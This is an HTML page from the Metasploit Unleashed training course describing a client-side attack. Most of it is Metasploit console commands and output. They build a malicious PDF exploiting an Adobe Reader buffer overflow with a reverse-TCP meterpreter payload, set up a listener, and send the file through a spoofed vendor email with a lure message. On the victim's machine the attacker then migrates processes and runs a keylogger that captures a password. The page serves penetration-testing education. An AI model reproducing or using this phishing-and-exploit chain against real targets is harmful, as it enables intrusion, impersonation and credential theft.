<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Client Side Attacks</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Client
Side Attacks</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">As we have already discussed,
Metasploit has many uses and another
one we will discuss here is client side attacks. To show the power of
how MSF can be used in client side attacks we will use a story.
</p>
<p style="color: rgb(0, 0, 0);">In the security world, social
engineering has become an
increasingly used attack vector. Even though technologies are changing,
one thing that seems to stay the same is the lack of security with
people. Due to that, social engineering has become a very "hot" topic
in the security world today. </p>
<p style="color: rgb(0, 0, 0);">In our first scenario our attacker has
been doing a lot of
information gathering using tools such as the Metasploit Framework,
Maltego and other tools to gather email addresses and information to
launch a social engineering client side attack on the victim.
</p>
<p style="color: rgb(0, 0, 0);">After a successful dumpster dive and
scraping for emails from the web, he has gained two key pieces of
information.
</p>
<p style="color: rgb(0, 0, 0);">1) They use "Best Computers" for
technical services.
</p>
<p style="color: rgb(0, 0, 0);">2) The IT Dept has an email address of
itdept@victim.com
</p>
<p style="color: rgb(0, 0, 0);">We want to gain shell on the IT
Departments computer and run a
key logger to gain passwords, intel or any other juicy tidbits of info.
</p>
<p style="color: rgb(0, 0, 0);">We start off by loading our msfconsole.
</p>
<p style="color: rgb(0, 0, 0);">After we are loaded we want to create a
malicious PDF that will
give the victim a sense of security in opening it. To do that, it must
appear legit, have a title that is realistic, and not be flagged by
anti-virus or other security alert software. </p>
<p style="color: rgb(0, 0, 0);">We are going to be using the Adobe
Reader 'util.printf()' JavaScript Function Stack Buffer Overflow
Vulnerability
</p>
<p style="color: rgb(0, 0, 0);">Adobe Reader is prone to a stack-based
buffer-overflow
vulnerability because the application fails to perform adequate
boundary checks on user-supplied data.
</p>
<p style="color: rgb(0, 0, 0);">An attacker can exploit this issue to
execute arbitrary code
with the privileges of the user running the application or crash the
application, denying service to legitimate users.
</p>
<p style="color: rgb(0, 0, 0);"><br>
So we start by creating our malicious PDF file for use in this client
side attack.
<br>
<br>
</p>
<pre id="code">msf &gt; use exploit/windows/fileformat/adobe_utilprintf<br>msf exploit(adobe_utilprintf) &gt; set FILENAME BestComputers-UpgradeInstructions.pdf<br>FILENAME =&gt; BestComputers-UpgradeInstructions.pdf<br>msf exploit(adobe_utilprintf) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(adobe_utilprintf) &gt; set LHOST 192.168.8.128<br>LHOST =&gt; 192.168.8.128<br>msf exploit(adobe_utilprintf) &gt; set LPORT 4455<br>LPORT =&gt; 4455<br>msf exploit(adobe_utilprintf) &gt; show options<br><br>Module options:<br><br>   Name        Current Setting                             Required  Description<br>   ----        ---------------                             --------  -----------<br>   FILENAME    BestComputers-UpgradeInstructions.pdf       yes       The file name.<br>   OUTPUTPATH  /pentest/exploits/framework3/data/exploits  yes       The location of the file.<br><br><br>Payload options (windows/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description            <br>   ----      ---------------  --------  -----------            <br>   EXITFUNC  process          yes       Exit technique: seh, thread, process<br>   LHOST     192.168.8.128    yes       The local address      <br>   LPORT     4455             yes       The local port         <br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Adobe Reader v8.1.2 (Windows XP SP3 English)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Once we have all the options set the
way we want, we run "exploit" to create our malicious file.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(adobe_utilprintf) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Creating 'BestComputers-UpgradeInstructions.pdf' file...<br>[*] Generated output file /pentest/exploits/framework3/data/exploits/BestComputers-UpgradeInstructions.pdf<br>[*] Exploit completed, but no session was created.<br>msf exploit(adobe_utilprintf) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">So we can see that our pdf file was
created in a sub-directory of
where we are. So lets copy it to our /tmp directory so it is easier to
locate later on in our exploit.
</span>
<p style="color: rgb(0, 0, 0);">Before we send the malicious file to
our victim we need to set up a
listener to capture this reverse connection. We will use msfconsole to
set up our multi handler listener.
<br>
<br>
</p>
<pre id="code">msf &gt; use exploit/multi/handler<br>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(handler) &gt; set LPORT 4455<br>LPORT =&gt; 4455<br>msf exploit(handler) &gt; set LHOST 192.168.8.128<br>LHOST =&gt; 192.168.8.128<br>msf exploit(handler) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that our listener is waiting to
receive its malicious payload
we have to deliver this payload to the victim and since in our
information gathering we obtained the email address of the IT
Department we will use a handy little script called sendEmail to
deliver this payload to the victim. With a kung-fu one-liner, we can
attach the malicious pdf, use any smtp server we want and write a
pretty convincing email from any address we want....
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf<br>Reading message body from STDIN because the '-m' option was not used.<br>If you are manually typing in a message:<br>  - First line must be received within 60 seconds.<br>  - End manual input with a CTRL-D on its own line.<br><br>IT Dept,<br><br>We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.<br><br>Sincerely,<br><br>Best Computers Tech Support<br>Aug 24 17:32:51 bt4 sendEmail[13144]: Message input complete.<br>Aug 24 17:32:51 bt4 sendEmail[13144]: Email was sent successfully!</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">As we can see here, the script
allows us to put any FROM (-f)
address, any TO (-t) address, any SMTP (-s) server as well as Titles
(-u) and our malicious attachment (-a). Once we do all that and press
enter we can type any message we want, then press CTRL+D and this will
send the email out to the victim.
</span>
<p style="color: rgb(0, 0, 0);">Now on the victim's machine, our IT
Department employee is getting
in for the day and logging into his computer to check his email.
</p>
<p style="color: rgb(0, 0, 0);">He sees the very important document and
copies it to his
desktop as he always does, so he can scan this with his favorite
anti-virus program.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:CSA-001.jpg"
 class="image"><img alt="CSA-001.jpg"
 src="http://www.offensive-security.com/w/images/e/ef/CSA-001.jpg"
 width="424" height="406"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
As we can see, it passed with flying colors so our IT admin is
willing to open this file to quickly implement these very important
upgrades. Clicking the file opens Adobe but shows a greyed out window
that never reveals a PDF. Instead, on the attackers machine what is
revealed....
<br>
<br>
</p>
<pre id="code">[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...<br>[*] Sending stage (718336 bytes)<br>session[*] Meterpreter session 1 opened (192.168.8.128:4455 -&gt; 192.168.8.130:49322)<br><br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We now have a shell on their
computer through a malicious PDF
client side attack. Of course what would be wise at this point is to
move the shell to a different process, so when they kill Adobe we don't
lose our shell. Then obtain system info, start a key logger and
continue exploiting the network.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; ps<br><br>Process list<br>============<br><br>    PID   Name            Path                                 <br>    ---   ----            ----                                 <br>    852   taskeng.exe     C:\Windows\system32\taskeng.exe      <br>    1308  Dwm.exe         C:\Windows\system32\Dwm.exe          <br>    1520  explorer.exe    C:\Windows\explorer.exe              <br>    2184  VMwareTray.exe  C:\Program Files\VMware\VMware Tools\VMwareTray.exe<br>    2196  VMwareUser.exe  C:\Program FilesVMware\VMware Tools\VMwareUser.exe<br>    3176  iexplore.exe    C:\Program Files\Internet Explorer\iexplore.exe<br>    3452  AcroRd32.exe    C:\Program Files\AdobeReader 8.0\ReaderAcroRd32.exe<br><br><u>meterpreter</u> &gt; migrate 1520<br>[*] Migrating to 1520...<br>[*] Migration completed successfully.<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: OFFSEC-PC<br>OS      : Windows Vista (Build 6000, ).<br><br><u>meterpreter</u> &gt; use priv<br>Loading extension priv...success.<br><br><u>meterpreter</u> &gt; keyscan_start<br>Starting the keystroke sniffer...<br><br><u>meterpreter</u> &gt; keyscan_dump<br>Dumping captured keystrokes...<br><br>Support,   I tried to open ti his file 2-3 times with no success.  I even had my admin and CFO tru   y it, but no one can get it to p open.  I turned on the rmote access server so you can log in to fix our p         this problem.  Our user name is admin and password for that session is 123456.   Call or eme ail when you are done.   Thanks IT Dept<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">GAME OVER
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Client_Side_Exploits"
 title="Client Side Exploits">Client-Side Exploits</a></div>
</body>
</html>
